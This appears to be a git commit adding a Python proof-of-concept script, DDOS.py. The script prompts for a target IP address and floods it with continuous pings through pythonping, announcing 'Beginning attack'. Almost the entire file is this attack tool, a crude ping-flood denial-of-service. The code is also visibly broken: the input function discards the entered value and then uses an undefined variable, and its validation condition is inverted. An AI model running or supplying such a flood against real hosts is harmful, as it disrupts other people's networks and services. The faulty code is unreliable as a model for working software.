4ce837e7bb5f3f932a607b7e91cdbd62c88fc355
GIl Yelkin <gil.yelkin@gmail.com>
2024-08-12 09:41:10 +0300

    moved contents of __init__.py to DDOS.py

--- DDOS-POC/DDOS.py
+++ DDOS-POC/DDOS.py
@@ -1,1 +1,36 @@
+import pythonping
+import re
+
+IP_REGEX_PATTERN_STRING = r'^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+IP_REGEX_MATCHER = re.compile(IP_REGEX_PATTERN_STRING)
+
+
+def get_ip_from_user() -> str:
+    input("Enter an ip address to DOS: \n"
+          "> ")
+
+    while not IP_REGEX_MATCHER.match(ip) is not None:
+        ip = input("Invalid IP address, please try again: \n"
+                   "> ")
+
+    return ip
+
+
+def main():
+    ip: str = get_ip_from_user()
+
+    print("Beginning attack, press CTRL+C at any moment to stop.")
+    try:
+        while True:
+            # By setting the timeout to 0, we can continuously send ping messages
+            # without waiting for the response, as we don't care about it.
+            pythonping.ping(ip, verbose=True, timeout=0)
+    except (KeyboardInterrupt, InterruptedError):
+        print("\nAttack Terminated.")
+    except BaseException:
+        print("An exception occurred, abandoning attack.")
+
+
+if __name__ == '__main__':
+    main()
 
